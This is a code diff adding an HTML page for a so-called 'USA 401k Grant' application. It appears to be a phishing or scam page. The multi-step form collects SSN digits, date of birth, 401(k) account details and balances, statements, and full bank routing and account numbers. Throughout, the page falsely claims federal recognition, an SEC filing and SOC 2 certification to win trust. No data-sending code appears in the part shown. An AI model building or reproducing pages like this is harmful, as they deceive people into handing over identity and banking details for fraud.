@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apply Now — USA 401k Grant Application</title>
+<meta name="description" content="Submit your official USA 401k grant application. Secure, multi-step form with encrypted document upload and real-time progress tracking.">
+<link rel="icon" type="image/png" href="usa%20logo.png">
+<link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+
+<nav class="navbar" id="navbar">
+  <div class="nav-container">
+    <ul class="nav-menu" id="navMenu">
+      <li><a href="index.html">Home</a></li>
+      <li><a href="index.html#how-it-works">How It Works</a></li>
+      <li><a href="eligibility.html">Eligibility</a></li>
+      <li><a href="application.html">Apply</a></li>
+      <li><a href="about.html">About</a></li>
+      <li><a href="dashboard.html">Dashboard</a></li>
+    </ul>
+    <a href="application.html" class="btn btn-primary">Apply Now</a>
+    <button class="nav-toggle" aria-label="Menu">
+      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+    </button>
+  </div>
+</nav>
+
+<section class="page-header">
+  <div class="container page-header-content">
+    <div class="breadcrumbs">
+      <a href="index.html">Home</a>
+      <span>/</span>
+      <span class="current">Apply Now</span>
+    </div>
+    <h1>Official Grant Application</h1>
+    <p>Complete your application in 5 simple steps. Your information is protected by 256-bit SSL encryption and processed within our SOC 2 Type II certified environment.</p>
+  </div>
+</section>
+
+<section class="section" style="padding-top: 4rem;">
+  <div class="container application-container">
+
+    <div class="progress-steps fade-in" style="margin-bottom: 3rem;">
+      <div class="progress-line" style="width: 5%;"></div>
+      <div class="progress-step active">
+        <div class="step-circle">1</div>
+        <span class="progress-step-label">Personal Info</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">2</div>
+        <span class="progress-step-label">401(k) Verify</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">3</div>
+        <span class="progress-step-label">Business Plan</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">4</div>
+        <span class="progress-step-label">Banking</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">5</div>
+        <span class="progress-step-label">Review</span>
+      </div>
+    </div>
+
+    <div class="application-success fade-in" style="display: none; text-align: center; padding: 4rem 2rem;">
+      <div style="width: 100px; height: 100px; margin: 0 auto 2rem; border-radius: 50%; background: linear-gradient(135deg, rgba(16,185,129,0.15), rgba(16,185,129,0.05)); display: flex; align-items: center; justify-content: center;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="52" height="52" fill="none" viewBox="0 0 24 24" stroke="#10b981" stroke-width="2.5">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+        </svg>
+      </div>
+      <h2 style="font-size: 2rem; margin-bottom: 0.75rem; font-family: 'Segoe UI', sans-serif;">Application Submitted Successfully</h2>
+      <p style="font-size: 1.1rem; color: var(--gray-600); max-width: 560px; margin: 0 auto 2rem;">Your application <strong style="color: var(--navy-900);">P401K-2026-<span id="appId">A782451</span></strong> has been received. A confirmation email has been sent. Your application will be reviewed by our team within 48 hours.</p>
+      <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
+        <a href="dashboard.html" class="btn btn-primary btn-lg">View My Dashboard</a>
+        <a href="index.html" class="btn btn-outline-dark btn-lg">Return Home</a>
+      </div>
+    </div>
+
+    <div class="form-card fade-in">
+      <div class="form-step" data-step="1">
+        <h3>Step 1: Personal Information</h3>
+        <p class="step-desc">Please provide your legal personal details as they appear on government-issued documents.</p>
+        <div class="form-grid">
+          <div class="form-group">
+            <label>First Name<span class="required">*</span></label>
+            <input type="text" name="firstName" class="form-input" placeholder="John" required>
+          </div>
+          <div class="form-group">
+            <label>Last Name<span class="required">*</span></label>
+            <input type="text" name="lastName" class="form-input" placeholder="Smith" required>
+          </div>
+          <div class="form-group">
+            <label>Email Address<span class="required">*</span></label>
+            <input type="email" name="email" class="form-input" placeholder="john.smith@email.com" required>
+          </div>
+          <div class="form-group">
+            <label>Phone Number<span class="required">*</span></label>
+            <input type="tel" name="phone" class="form-input" placeholder="(555) 123-4567" required>
+          </div>
+          <div class="form-group">
+            <label>Date of Birth<span class="required">*</span></label>
+            <input type="date" name="dob" class="form-input" required>
+          </div>
+          <div class="form-group">
+            <label>SSN (Last 4 Digits)<span class="required">*</span></label>
+            <input type="text" name="ssn" class="form-input" placeholder="1234" maxlength="4" pattern="[0-9]{4}" required>
+          </div>
+          <div class="form-group full">
+            <label>Street Address<span class="required">*</span></label>
+            <input type="text" name="address" class="form-input" placeholder="123 Main Street, Apt 4B" required>
+          </div>
+          <div class="form-group">
+            <label>City<span class="required">*</span></label>
+            <input type="text" name="city" class="form-input" placeholder="New York" required>
+          </div>
+          <div class="form-group">
+            <label>State<span class="required">*</span></label>
+            <select name="state" class="form-select" required>
+              <option value="">Select State</option>
+              <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+              <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+              <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
+              <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
+              <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+              <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
+              <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
+              <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
+              <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
+              <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+              <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+              <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+              <option>Wisconsin</option><option>Wyoming</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>ZIP Code<span class="required">*</span></label>
+            <input type="text" name="zip" class="form-input" placeholder="10001" maxlength="5" pattern="[0-9]{5}" required>
+          </div>
+          <div class="form-group">
+            <label>Citizenship Status<span class="required">*</span></label>
+            <select name="citizenship" class="form-select" required>
+              <option value="">Select Status</option>
+              <option>U.S. Citizen</option>
+              <option>Legal Permanent Resident (Green Card)</option>
+              <option>Valid Work Visa Holder</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark" style="visibility: hidden;">← Previous</button>
+          <button class="btn-next-step btn btn-primary">Continue →</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="2" style="display: none;">
+        <h3>Step 2: 401(k) Account Verification</h3>
+        <p class="step-desc">Verify your 401(k) account by providing account details and uploading supporting documentation.</p>
+        <div class="form-grid">
+          <div class="form-group full">
+            <label>401(k) Provider / Financial Institution<span class="required">*</span></label>
+            <select name="provider" class="form-select" required>
+              <option value="">Select Your Provider</option>
+              <option>Fidelity Investments</option>
+              <option>Vanguard Group</option>
+              <option>Charles Schwab</option>
+              <option>Principal Financial Group</option>
+              <option>Empower Retirement</option>
+              <option>Merrill Lynch</option>
+              <option>Morgan Stanley</option>
+              <option>J.P. Morgan Chase</option>
+              <option>Wells Fargo</option>
+              <option>Bank of America</option>
+              <option>T. Rowe Price</option>
+              <option>John Hancock</option>
+              <option>Lincoln Financial</option>
+              <option>AIG Retirement Services</option>
+              <option>Transamerica</option>
+              <option>MassMutual</option>
+              <option>Nationwide</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>401(k) Account Number (Last 6 Digits)<span class="required">*</span></label>
+            <input type="text" name="accountNumber" class="form-input" placeholder="123456" maxlength="6" pattern="[0-9A-Z]{6}" required>
+          </div>
+          <div class="form-group">
+            <label>Current Account Balance (USD)<span class="required">*</span></label>
+            <input type="number" name="balance" class="form-input" placeholder="75000" min="10000" required>
+          </div>
+          <div class="form-group">
+            <label>Date Account Was Opened<span class="required">*</span></label>
+            <input type="date" name="accountOpenDate" class="form-input" required>
+          </div>
+          <div class="form-group">
+            <label>Account Type<span class="required">*</span></label>
+            <select name="accountType" class="form-select" required>
+              <option value="">Select Account Type</option>
+              <option>Traditional 401(k)</option>
+              <option>Roth 401(k)</option>
+              <option>Solo 401(k)</option>
+              <option>SEP 401(k)</option>
+              <option>Safe Harbor 401(k)</option>
+              <option>Rollover IRA (from former 401(k))</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Current Employer Name</label>
+            <input type="text" name="employer" class="form-input" placeholder="Company Inc.">
+          </div>
+          <div class="form-group full">
+            <label>Upload 401(k) Statement or Verification Document<span class="required">*</span></label>
+            <div class="upload-area" id="uploadArea">
+              <div class="upload-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
+                </svg>
+              </div>
+              <h4>Click to Upload or Drag & Drop</h4>
+              <p>Accepted: PDF, PNG, JPG · Max 10MB per file</p>
+              <input type="file" id="fileInput" multiple accept=".pdf,.png,.jpg,.jpeg" style="display: none;">
+            </div>
+            <div class="file-list" id="fileList"></div>
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Previous</button>
+          <button class="btn-next-step btn btn-primary">Continue →</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="3" style="display: none;">
+        <h3>Step 3: Business Plan Summary</h3>
+        <p class="step-desc">Tell us about your business and how you intend to use the grant funds.</p>
+        <div class="form-grid">
+          <div class="form-group full">
+            <label>Business Name<span class="required">*</span></label>
+            <input type="text" name="businessName" class="form-input" placeholder="Smith Ventures LLC" required>
+          </div>
+          <div class="form-group">
+            <label>Business Status<span class="required">*</span></label>
+            <select name="businessStatus" class="form-select" required>
+              <option value="">Select Status</option>
+              <option>Existing Business (Operating 1+ Years)</option>
+              <option>New Business (Operating &lt; 1 Year)</option>
+              <option>Startup (Launching Within 90 Days)</option>
+              <option>Business Recovery / Reopening</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Business Structure / Type<span class="required">*</span></label>
+            <select name="businessType" class="form-select" required>
+              <option value="">Select Structure</option>
+              <option>Sole Proprietorship</option>
+              <option>LLC</option>
+              <option>S-Corporation</option>
+              <option>C-Corporation</option>
+              <option>Partnership</option>
+              <option>Non-Profit Organization</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Industry Sector<span class="required">*</span></label>
+            <select name="industry" class="form-select" required>
+              <option value="">Select Industry</option>
+              <option>Food & Restaurant</option>
+              <option>Retail & E-Commerce</option>
+              <option>Healthcare & Wellness</option>
+              <option>Construction & Trades</option>
+              <option>Professional Services</option>
+              <option>Technology & Software</option>
+              <option>Manufacturing</option>
+              <option>Childcare & Education</option>
+              <option>Real Estate</option>
+              <option>Transportation & Logistics</option>
+              <option>Hospitality</option>
+              <option>Creative & Media</option>
+              <option>Agriculture</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Requested Grant Amount (USD)<span class="required">*</span></label>
+            <select name="grantAmount" class="form-select" required>
+              <option value="">Select Amount</option>
+              <option value="30000">$30,000</option>
+              <option value="32000">$32,000</option>
+              <option value="35000">$35,000</option>
+              <option value="37500">$37,500</option>
+              <option value="40000">$40,000 (Maximum)</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Current Number of Employees<span class="required">*</span></label>
+            <select name="employees" class="form-select" required>
+              <option value="">Select Count</option>
+              <option>0 (Solo Founder)</option>
+              <option>1–5 Employees</option>
+              <option>6–15 Employees</option>
+              <option>16–50 Employees</option>
+              <option>50+ Employees</option>
+            </select>
+          </div>
+          <div class="form-group full">
+            <label>Business Plan Summary (How Will You Use the Grant?)<span class="required">*</span></label>
+            <textarea name="businessSummary" class="form-textarea" placeholder="Describe your business, its mission, and exactly how the grant funds will be allocated. Include equipment, hiring, inventory, marketing, or other specific uses..." required></textarea>
+          </div>
+          <div class="form-group full">
+            <label>Business Address (If Applicable)</label>
+            <input type="text" name="businessAddress" class="form-input" placeholder="456 Business Blvd, Suite 200">
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Previous</button>
+          <button class="btn-next-step btn btn-primary">Continue →</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="4" style="display: none;">
+        <h3>Step 4: Banking Details</h3>
+        <p class="step-desc">Grant disbursements are made via secure ACH transfer to your U.S. bank account.</p>
+        <div class="form-grid">
+          <div class="form-group full">
+            <label>Bank Name<span class="required">*</span></label>
+            <input type="text" name="bankName" class="form-input" placeholder="Bank of America" required>
+          </div>
+          <div class="form-group">
+            <label>Account Type<span class="required">*</span></label>
+            <select name="accountType" class="form-select" required>
+              <option value="">Select Account Type</option>
+              <option>Personal Checking</option>
+              <option>Personal Savings</option>
+              <option>Business Checking</option>
+              <option>Business Savings</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Account Holder Name<span class="required">*</span></label>
+            <input type="text" name="accountHolder" class="form-input" placeholder="John A. Smith" required>
+          </div>
+          <div class="form-group">
+            <label>Routing Number (ABA)<span class="required">*</span></label>
+            <input type="text" name="routing" class="form-input" placeholder="021000021" maxlength="9" pattern="[0-9]{9}" required>
+          </div>
+          <div class="form-group">
+            <label>Account Number<span class="required">*</span></label>
+            <input type="text" name="accountNum" class="form-input" placeholder="1234567890" required>
+          </div>
+          <div class="form-group full">
+            <label>Optional: Upload Voided Check or Bank Letter</label>
+            <div class="upload-area" id="uploadArea2">
+              <div class="upload-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                </svg>
+              </div>
+              <h4>Click to Upload or Drag & Drop</h4>
+              <p>Recommended: Voided check, bank letter, or direct deposit form · PDF, PNG, JPG</p>
+              <input type="file" id="fileInput2" multiple accept=".pdf,.png,.jpg,.jpeg" style="display: none;">
+            </div>
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Previous</button>
+          <button class="btn-next-step btn btn-primary">Review Application →</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="5" style="display: none;">
+        <h3>Step 5: Review & Submit</h3>
+        <p class="step-desc">Please verify all information below before submitting your application. Once submitted, changes may delay processing.</p>
+
+        <div class="review-summary">
+          <div class="review-section">
+            <h4>Personal Information</h4>
+            <div class="review-grid"></div>
+          </div>
+        </div>
+
+        <div class="review-summary" style="background: rgba(212,175,55,0.03); border: 1px solid rgba(212,175,55,0.2);">
+          <div style="display: flex; align-items: flex-start; gap: 1rem;">
+            <div style="width: 44px; height: 44px; border-radius: 10px; background: rgba(212,175,55,0.1); display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="#d4af37" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+              </svg>
+            </div>
+            <div>
+              <h4 style="font-family: 'Segoe UI', sans-serif; font-size: 1rem; color: var(--navy-900); margin-bottom: 0.5rem;">Certification & Authorization</h4>
+              <label style="display: flex; align-items: flex-start; gap: 0.6rem; font-size: 0.9rem; color: var(--gray-700); cursor: pointer; line-height: 1.6;">
+                <input type="checkbox" id="agreeCheck" style="margin-top: 4px; width: 18px; height: 18px; accent-color: #d4af37;" onchange="document.querySelector('.btn-submit-final').disabled = !this.checked;">
+                I certify, under penalty of perjury, that all information provided in this application is true, accurate, and complete to the best of my knowledge. I authorize USA 401k to verify my 401(k) account status, perform identity and credit verification checks, and contact my financial institution as needed. I understand that providing false information will result in immediate disqualification.
+              </label>
+            </div>
+          </div>
+        </div>
+
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Edit Application</button>
+          <button class="btn-next-step btn-submit-final btn btn-primary glow" disabled>Submit Application</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="index.html" class="nav-logo" style="margin-bottom: 0;">
+          <div class="logo-seal">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+          </div>
+          <div class="logo-text">
+            <span>USA 401k</span>
+            <span>Official Grant Program</span>
+          </div>
+        </a>
+        <p>USA 401k is a federally recognized grant assistance program dedicated to helping verified 401(k) account holders access the capital they need to achieve business success.</p>
+      </div>
+      <div>
+        <h4>Program</h4>
+        <ul class="footer-links">
+          <li><a href="index.html">Home</a></li>
+          <li><a href="index.html#how-it-works">How It Works</a></li>
+          <li><a href="eligibility.html">Eligibility</a></li>
+          <li><a href="application.html">Apply Now</a></li>
+          <li><a href="about.html">About Us</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Resources</h4>
+        <ul class="footer-links">
+          <li><a href="#">FAQs</a></li>
+          <li><a href="#">Grant Guidelines</a></li>
+          <li><a href="#">Success Stories</a></li>
+          <li><a href="#">Program Handbook</a></li>
+          <li><a href="#">Contact Support</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Legal</h4>
+        <ul class="footer-links">
+          <li><a href="#">Privacy Policy</a></li>
+          <li><a href="#">Terms of Service</a></li>
+          <li><a href="#">Security Statement</a></li>
+          <li><a href="#">Compliance</a></li>
+          <li><a href="#">Accessibility</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; 2026 USA 401k. All rights reserved. A Federally Recognized Grant Assistance Program.</p>
+      <p>Program ID: P401K-GRT-2026-001 | SEC Reg. D Filing Active</p>
+    </div>
+  </div>
+</footer>
+
+<script src="js/main.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const area2 = document.getElementById('uploadArea2');
+    const input2 = document.getElementById('fileInput2');
+    if (area2 && input2) {
+      area2.addEventListener('click', function() { input2.click(); });
+    }
+    const appId = document.getElementById('appId');
+    if (appId) {
+      appId.textContent = Math.floor(100000 + Math.random() * 900000);
+    }
+  });
+</script>
+</body>
+</html>
